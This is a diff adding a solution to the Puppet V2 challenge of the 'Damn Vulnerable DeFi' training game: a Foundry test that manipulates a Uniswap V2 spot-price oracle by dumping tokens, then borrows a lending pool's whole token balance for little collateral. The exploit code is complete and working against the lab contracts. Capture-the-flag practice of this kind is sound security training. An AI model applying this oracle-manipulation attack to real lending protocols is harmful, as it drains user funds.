@@ -9,6 +9,7 @@ import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUn
 import {WETH} from "solmate/tokens/WETH.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {PuppetV2Pool} from "../../src/puppet-v2/PuppetV2Pool.sol";
+import {UniswapV2Library} from "../../src/puppet-v2/UniswapV2Library.sol";
 
 contract PuppetV2Challenge is Test {
     address deployer = makeAddr("deployer");
@@ -98,7 +99,66 @@ contract PuppetV2Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV2() public checkSolvedByPlayer {
-        
+        // Player - 20 WETH and 10k DVTs
+        // Required for 1 token is 0.3 ether
+        // 300000 WETH for the whole pool
+
+        // This means to get a small quote, we need to
+        // increase reserve A and/or decrease reserve B
+        // Reserve A is Token
+        // Reserve B is WETH
+
+        // Boils down to (amountA * reserveB / reserveA);
+        // Amount will be 1_000_000e18
+        console.log("ETH Balance ", player.balance);
+
+        logInfo();
+
+        address[] memory path = new address[](2);
+        path[0] = address(token);
+        path[1] = address(weth);
+
+        token.approve(address(uniswapV2Router), POOL_INITIAL_TOKEN_BALANCE);
+
+        uint256 wethOut = 9900695134061569016; // from the getAmountOut
+        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
+            PLAYER_INITIAL_TOKEN_BALANCE, wethOut, path, player, block.timestamp
+        );
+
+        console.log("Swapped");
+
+        logInfo();
+
+        console.log("ETH Balance ", player.balance);
+
+        weth.deposit{value: player.balance}();
+
+        weth.approve(address(lendingPool), weth.balanceOf(player));
+
+        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
+        token.transfer(recovery, token.balanceOf(player));
+    }
+
+    function logInfo() internal view {
+        (uint256 reservesWETH, uint256 reservesToken) = UniswapV2Library.getReserves({
+            factory: address(uniswapV2Factory),
+            tokenA: address(weth),
+            tokenB: address(token)
+        });
+
+        uint256 quote = UniswapV2Library.quote({
+            amountA: POOL_INITIAL_TOKEN_BALANCE * 10 ** 18,
+            reserveA: reservesToken,
+            reserveB: reservesWETH
+        });
+
+        console.log("Initial Quote: ", quote * 3 / 1 ether);
+
+        console.log("Price DVT", UniswapV2Library.getAmountOut(20 ether, reservesWETH, reservesToken));
+        console.log("Price WETH", UniswapV2Library.getAmountOut(10000 ether, reservesToken, reservesWETH));
+        console.log(
+            "calculateDepositOfWETHRequired: ", lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)
+        );
     }
 
     /**
